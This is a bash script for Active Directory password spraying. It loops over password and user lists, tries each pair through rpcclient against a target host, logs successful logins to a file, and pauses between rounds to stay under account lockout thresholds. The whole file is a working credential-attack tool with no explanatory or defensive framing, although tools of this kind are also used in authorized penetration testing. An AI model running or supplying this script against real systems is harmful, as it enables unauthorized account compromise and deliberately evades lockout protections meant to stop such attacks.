#!/bin/bash

TARGET=$1
DOMAIN=$2
USERFILE=$3
PASSFILE=$4
MAX_ATTEMPTS=$5
LOCKOUT_MIN=$6

BUFFER=30
LOCKOUT_SEC=$((LOCKOUT_MIN * 60 + BUFFER))
ATTEMPT_COUNT=0

echo "Target: $TARGET"
echo "Domain: $DOMAIN"
echo "Users: $USERFILE"
echo "Passwords: $PASSFILE"
echo "Max attempts before sleep: $MAX_ATTEMPTS"
echo "Lockout reset time: $LOCKOUT_MIN minutes"
echo ""

while read password; do

    echo "[*] Spraying password: $password"

    while read user; do

        result=$(rpcclient -U "$DOMAIN/$user%$password" -c "getusername" $TARGET 2>&1)

        if echo "$result" | grep -q "Account Name"; then
            echo "[+] VALID: $user:$password"
            echo "$user:$password" >> valid_creds.txt
        else
            echo "[-] Failed: $user:$password"
        fi

    done < "$USERFILE"

    ATTEMPT_COUNT=$((ATTEMPT_COUNT+1))

    if [ "$ATTEMPT_COUNT" -ge "$MAX_ATTEMPTS" ]; then
        echo ""
        echo "[!] Max attempts reached. Sleeping $LOCKOUT_MIN minutes..."
        sleep $LOCKOUT_SEC
        ATTEMPT_COUNT=0
        echo ""
    fi

done < "$PASSFILE"
